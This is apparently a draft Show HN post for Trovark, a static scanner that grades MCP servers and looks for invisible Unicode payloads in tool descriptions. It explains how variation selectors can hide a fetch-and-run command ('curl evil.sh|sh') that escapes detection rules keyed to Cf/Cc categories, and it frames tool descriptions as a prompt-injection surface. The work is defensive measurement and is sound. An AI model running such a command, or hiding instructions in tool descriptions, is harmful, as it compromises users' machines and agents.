# Show HN draft — Trovark (v2, written 2026-08-04)

*Draft for Ambuj to edit into his own voice and post when ready. Nothing is posted automatically. Numbers below are from the 2026-08-04 scan (rubric v1.5.0) — **regenerate the scan the morning you post** and update them, or don't cite them.*

---

## Title (pick one)

- **Show HN: Trovark – I scanned 400 MCP servers for invisible payloads in tool descriptions**
- **Show HN: Trovark – a trust score for MCP servers, where every finding is a fact, not a verdict**
- **Show HN: Trovark – npx trovark <server>**

## URL

`https://lets-order-some-fries.github.io/trovark/`

## Body

I kept adding MCP servers to my agents with no real sense of which ones were maintained, safe, or about to break. So I built **Trovark**: one command that grades any MCP server from **static, public signals only** — it never runs the server's code.

    npx trovark github/github-mcp-server

Four dimensions: **health** (maintained, or one commit from abandonment?), **reliability** (current spec? tests, CI, pinned deps?), **security** (risky tool surface, dependency CVEs via OSV), and **context cost** (how many tokens its tool schema eats). Every finding links to its evidence. The rubric is versioned and public.

Then I ran it across **400 servers** from the community lists and published the index. Current state: 321 graded, 32 correctly identified as libraries rather than servers, 29 honestly withheld, 18 dead links. Grade curve A 59 · B 152 · C 91 · D 17 · F 2 (avg 74). 51 servers are stale past 180 days; 66 expose shell/exec-shaped tools.

### The part I actually want feedback on

MCP clients read a server's **tool descriptions into the model's context** before you ever call a tool. That makes the description a live attack surface — and it's exactly the surface a static scanner can see.

One encoding is worth knowing about: **Unicode variation selectors**. A description that renders as `Adds two numbers` (16 visible characters) can carry 31 codepoints, where the hidden 15 decode to `curl evil.sh|sh`. Here's the part that made me build the check —

```
U+FE00, U+FE0F, U+E0100, U+E01EF  →  \p{Cf}: false   \p{Mn}: true
```

Variation selectors are Unicode category **Mn**, so the usual "hidden character" rule shape (matching the Cf/Cc categories) **cannot match them at all**. That's a ten-second thing to verify in a Node REPL, and it's the gap the check exists to close.

**Evidence class, stated plainly:** the *encoding* is documented in the wild — GlassWorm shipped variation-selector-encoded payloads to 35k+ installs — but that was **OpenVSX/npm, not MCP**. I have **no** in-the-wild MCP instance. So I measured instead of asserting.

### The measurement

Across 400 servers: **5,472 files · 56,657,055 characters · 5,406 tool definitions · 0 scan errors.**

**Result: zero decode-confirmed payloads.**

A zero is the honest headline, and the near-miss data is why it's useful rather than boring:

| run length | 1 | 2 | 3 | ≥4 |
|---|---|---|---|---|
| variation selectors | 388 | 0 | 0 | **0** |
| tag block | 0 | 0 | 0 | **0** |
| bidi marks | 2 | 0 | 0 | **0** |

Every legitimate occurrence in 56.7M characters is a run of length **exactly one** — 388 of them are `U+FE0F`, the emoji presentation selector (e.g. a tool description reading `⚠️ DEPRECATED`). There is not a single run of two or three anywhere in the corpus. My detection threshold was **pre-registered at 4 before I ran any of this**, so it has three full steps of margin and I couldn't have tuned it to the data afterwards. The raw results are committed as JSON.

Incidentally, a blanket "flag hidden Unicode" rule would have flagged 7 codepoints here (RTL marks, a BOM) — all benign. It also flags TypeScript's own standard library. I report that I found them; I don't accuse anyone over them.

### The design rule everything else follows from

I researched about 50 candidate detectors and threw out nearly all of them, including my own first idea (score tool descriptions for "poisoning"-style instructions). The rule I kept:

> **Only ship a check when a false positive is impossible by construction — because the finding is a fact, not a verdict.**

"This description looks malicious" is a verdict; at a realistic base rate it's a machine for defaming maintainers. "These 15 codepoints at `path:line:col` decode to this ASCII string" is a fact you can check yourself.

That rule is also why the tool **refuses to grade** in several situations: it says *"insufficient data"* when it can't read a server's tool surface rather than inventing a clean bill; *"library — not an MCP server"* for SDK repos; and *"repo unavailable"* for dead links instead of publishing an F on something it never fetched. Each of those started as a bug where it confidently published something untrue.

### Limits, up front

- I fetch **≤24 files per repo** and truncate large ones. This is not a full repository scan and I don't claim it is; the report lists what was read.
- Tool extraction covers manifests, OpenAPI, TS/JS, Python, Go. Rust/Java/C# servers mostly land in "insufficient data".
- Secret-scanning is a deliberately **low-confidence** signal — I measured ~13% precision on it, so it's labelled a candidate and barely affects the grade. Use gitleaks/trufflehog for the real thing.
- 400 servers is a slice of the ecosystem, not all of it.

Stack: TypeScript, one runtime dependency, free public APIs, no LLM anywhere in the scoring path. Apache-2.0.

**What I'd like from you:** tell me where a grade is wrong. That's how the rubric gets calibrated, and every rule is in the repo to argue with.

Repo: https://github.com/lets-order-some-fries/trovark
npm: https://www.npmjs.com/package/trovark

---

## Posting notes (for Ambuj, not the post)

- **Regenerate the scan the morning you post** (`discover → scan → site`), then update every number above. Stale numbers are the one thing that would undercut the whole "facts, not verdicts" pitch.
- Post 8–10am ET on a weekday. Be around for the first 2–3 hours — HN rewards the author engaging.
- Lead replies with substance; concede limits fast. The audience here respects "here's what it can't do".
- **Never name a specific repo as having a security problem in comments** — aggregate only. Per-repo claims need per-repo verification.
- If asked *"why not just use Snyk/mcp-scan?"*: they solve a different problem (per-user config scanning, runtime guardrails, LLM-backed semantic checks). Trovark is a public index with published deterministic rules you can run offline and reproduce. Don't claim to beat them on coverage — you won't.
- If asked *"isn't a zero result boring?"*: no — it's the first published prevalence baseline for this, and a clean negative **is** the precision evidence for the detector.
- If someone finds a real payload with it, that's the best possible outcome — say so publicly and credit them.
